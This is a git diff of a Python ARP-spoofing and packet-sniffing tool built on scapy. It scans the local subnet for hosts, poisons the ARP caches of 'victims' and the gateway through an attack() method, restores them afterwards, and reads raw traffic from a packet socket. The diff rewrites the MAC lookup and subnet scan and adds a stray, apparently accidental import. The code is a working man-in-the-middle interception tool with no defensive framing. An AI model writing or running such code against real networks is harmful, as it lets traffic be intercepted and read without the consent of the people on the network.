@@ -3,6 +3,8 @@ import struct
 import uuid
 import codecs
 import binascii
+from tabnanny import verbose
+
 import psutil
 import time
 import os
@@ -31,12 +33,8 @@ def get_mac_adress(bytes_addres):
 
 host_ip = socket.gethostbyname(socket.gethostname())
 host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
-host_b_ip = socket.inet_aton(host_ip)
-host_b_mac = binascii.unhexlify(host_mac.replace(':', ''))
 gateway_ip = get_default_gateway_linux()
-gateway_b_ip = socket.inet_aton(gateway_ip)
 gateway_mac = ''
-gateway_b_mac = b''
 
 
 # Unpack ethernet frame (AA:BB:CC:DD:EE:FF)
@@ -229,26 +227,27 @@ def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
     send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
     send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
 
-def get_mac(IP, interface):
-    conf.verb = 0
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-    for snd,rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
+def get_mac(ip):
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    ans_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    for i in ans_list:
+        return i[1].hwsrc
 
 class Client():
-    def __init__(self, ip, mac, interface):
+    def __init__(self, ip, mac):
         self.ip = ip
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
-        self.interface = interface
 
 class IPtable():
-    def __init__(self):
+    def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
         self.mac = host_mac
         self.ip = host_ip
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
-        self.clients = [Client(self.ip, self.mac, None), Client(self.gateway_ip, self.gateway_mac)]
+        self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
 
     def find(self, client):
         for i, c in enumerate(self.clients):
@@ -267,12 +266,12 @@ class IPtable():
             restore(client.ip, client.mac, self.gateway_ip, self.mac)
 
     def scan(self):
-        interfaces = psutil.net_if_addrs()
-        for interface_name, addresses in interfaces.items():
-            for address in addresses:
-                if address.family == psutil.AF_INET:  # IPv4-адрес
-                    c = Client(address.address, get_mac(address.address, interface_name), interface_name)
-                    self.emplase(c)
+        arp_request = ARP(pdst = self.ip[:-3]+"1/24")
+        broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast/arp_request
+        ans_list = srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
+        for i in ans_list:
+            self.emplase(Client(i[1].psrc, i[1].hwsrc))
 
     def attack(self):
         for client in self.clients:
@@ -282,10 +281,9 @@ class IPtable():
 
 def main():
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-    gateway_mac = get_mac(gateway_b_ip)
-    Ips = IPtable()
+    gateway_mac = get_mac(gateway_ip)
+    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
     Ips.scan()
-    t = time.time_ns()
     Ips.attack()
     while (True):
         raw_data, address = conn.recvfrom(65535)
